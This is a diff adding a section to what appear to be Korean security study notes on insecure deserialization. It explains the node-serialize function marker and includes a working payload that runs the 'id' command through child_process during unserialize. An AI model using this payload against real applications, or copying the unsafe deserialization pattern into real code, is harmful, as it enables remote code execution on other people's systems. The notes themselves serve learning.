@@ -1227,7 +1227,40 @@
                 # 역직렬화
                 pickle.loads(ClassA_dump) # pickle.loads(data): 직렬화되어 있는 바이트 객체(bytes object)를 파이썬 객체로 역직렬화함
                 ```
-        + javascript (NodeJS)
+        + javascript (NodeJS) - 📌 대표적인 모듈: **node-serialize** 모듈 [🔗](https://www.npmjs.com/package/node-serialize)
+            - serialize(직렬화) 예시
+                ```javascript
+                var serialize = require('node-serialize'); // require() 함수를 이용해 node-serialize 모듈을 불러옴
+                x = {
+                    test: function() {return 'Hello'; } // 함수를 포함하는 object
+                };
+
+                console.log(serialize.serialize(x));
+                /* ↳ x를 직렬화한 결과
+                    { "test":"_$$ND_FUNC$$_function(){ return 'Hello'; }" }
+                    → 💡 node-serialize 모듈의 직렬화된 포맷에서 _$$ND_FUNC$$_은 함수를 의미함
+                */
+
+                // 직렬화된 object 값을 역직렬화 시키면 원래 object 형태로 나옴
+                serialize_func_1 = { "test":"_$$ND_FUNC$$_function(){ return 'Hello'; }" };
+                console.log(serialize.unserialize(serialize_func_1)); // 직렬화된 x를 역직렬화시킨 결과: { test: [Function (anonymous)] }
+                serialize.unserialize(serialize_func_1)['test'](); // 직렬화된 x를 역직렬화시킨 후 test에 해당하는 함수를 실행시킨 결과: 'Hello'
+
+                // ⚠️ 직렬화된 object의 결과에서 내부에 포함된 함수가 역직렬화 과정에서 실행되게 하는 방법
+                serialize_func_2 = { "test":"_$$ND_FUNC$$_function(){ return 'Hello'; }()" }; // _$$ND_FUNC$$_로 시작하는 함수 {}의 뒤에 ()를 붙여 실행함
+                console.log(serialize.unserialize(serialize_func_2)); // 역직렬화 과정에서 함수가 실행됨: { test: 'Hello' }
+                ```
+            - 원격 로드 실행 페이로드
+                ```javascript
+                var serialize = require('node-serialize'); // require() 함수를 이용해 node-serialize 모듈을 불러옴
+
+                serialize_exploit_func = {"test":"_$$ND_FUNC$$_function (){require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });}()"} // ⚠️ id 명령어의 결과가 화면에 출력되도록 함수를 작성한 다음 맨 뒤에 ()를 붙여 실행되도록 만듦
+                console.log(serialize.unserialize(serialize_exploit_func)); // 역직렬화 과정에서 함수가 실행되어 id 명령어의 결과가 화면에 출력됨 → uid, gid, groups에 대한 정보를 얻을 수 있음
+                ```
+
+<br/><br/>
+
+### PHP Specific Vulnerability: PHP의 특징으로 인해 발생할 수 있는 취약점
 
 <br/><br/><br/>
 
